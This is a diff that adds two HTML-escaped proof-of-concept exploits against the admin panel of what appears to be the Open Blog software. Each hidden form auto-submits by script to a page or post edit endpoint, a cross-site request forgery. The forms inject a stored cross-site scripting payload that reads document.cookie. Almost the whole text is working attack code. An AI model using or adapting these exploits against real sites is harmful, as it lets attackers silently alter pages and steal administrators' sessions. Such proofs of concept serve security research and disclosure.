@@ -1,0 +1,27 @@
+&lt;form action=&quot;http://www.example.com/admin/pages/edit&quot; method=&quot;post&quot; &gt;
+&lt;input type=&quot;hidden&quot; name=&quot;title&quot; value=&quot;open blog page title&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;content&quot; value='Some page content and &lt;script&gt;alert(document.cookie)&lt;/script&gt;' /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;status&quot; value=&quot;active&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;id&quot; value=&quot;1&quot; /&gt;
+&lt;input type=&quot;submit&quot; name=&quot;submit&quot; id=&quot;sbmtit&quot; value=&quot;Edit &rsaquo;&rsaquo;&quot; /&gt;
+&lt;/form&gt;
+&lt;script&gt;
+document.getElementById('sbmtit').click();
+&lt;/script&gt;
+
+
+
+&lt;form action=&quot;http://www.example.com/admin/posts/edit&quot; method=&quot;post&quot; &gt;
+&lt;input type=&quot;hidden&quot; name=&quot;title&quot; value=&quot;Welcome to Open Blog&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;excerpt&quot; value='Some text&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;' /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;content&quot; value=&quot;&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;categories[]&quot; value=&quot;1&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;tags&quot; value=&quot;openblog&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;publish_date&quot; value=&quot;13/07/2010&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;status&quot; value=&quot;published&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;id&quot; value=&quot;1&quot; /&gt;
+&lt;input type=&quot;submit&quot; name=&quot;submit&quot; id=&quot;sbmtit&quot; value=&quot;Edit &rsaquo;&rsaquo;&quot; /&gt;
+&lt;/form&gt;
+&lt;script&gt;
+document.getElementById('sbmtit').click();
+&lt;/script&gt;
